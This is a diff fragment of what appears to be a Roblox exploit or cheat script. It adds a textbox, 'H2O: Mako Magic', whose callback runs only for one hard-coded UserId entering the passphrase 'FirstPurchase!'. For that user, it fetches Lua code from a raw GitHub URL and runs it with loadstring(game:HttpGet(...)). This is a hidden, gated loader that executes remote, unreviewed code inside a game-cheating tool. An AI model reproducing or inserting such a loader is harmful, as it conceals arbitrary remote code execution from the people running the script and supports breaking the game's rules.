@@ -563,6 +563,25 @@ end
 	end	  
 })
 
+BennettTab:AddTextbox({
+	Name = "H2O: Mako Magic",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+
+if game:GetService("Players").LocalPlayer.UserId == 3749585450 then
+if Value == "FirstPurchase!" then
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ssxaa1/UntitledRev/main/oce'),true))()
+
+end
+end
+
+
+	end	  
+})
+
+
 local BennettTab = Window:MakeTab({
 	Name = "Admin",
 	Icon = "rbxassetid://14458282849",
